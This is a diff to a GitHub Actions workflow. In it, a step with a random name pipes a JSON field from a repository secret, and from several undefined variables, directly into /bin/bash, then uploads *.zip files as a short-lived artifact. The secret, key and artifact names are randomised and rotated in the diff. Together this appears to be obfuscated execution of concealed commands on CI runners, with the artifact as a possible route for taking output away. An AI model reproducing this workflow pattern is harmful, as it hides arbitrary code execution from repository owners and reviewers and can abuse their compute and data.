@@ -9,15 +9,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: rachelalex7167
         env:
-          jrt43567: ${{ secrets.jrt43567 }}
+          m302: ${{ secrets.m302 }}
         run: |
-          printf '%s' "$jrt43567" | jq -r .vmvt761 | /bin/bash
-          echo $ljlzp641 | jq -r .ima80 | /bin/bash
-          echo $se56503 | jq -r .gm942 | /bin/bash
+          printf '%s' "$m302" | jq -r .xv5012 | /bin/bash
+          echo $ajvox330 | jq -r .msud6 | /bin/bash
+          echo $l9 | jq -r .wg96123 | /bin/bash
+          echo $uyue67 | jq -r .d95 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: VMHXtex9
+          name: x8uFeYOV
           path: "*.zip"
           retention-days: 1
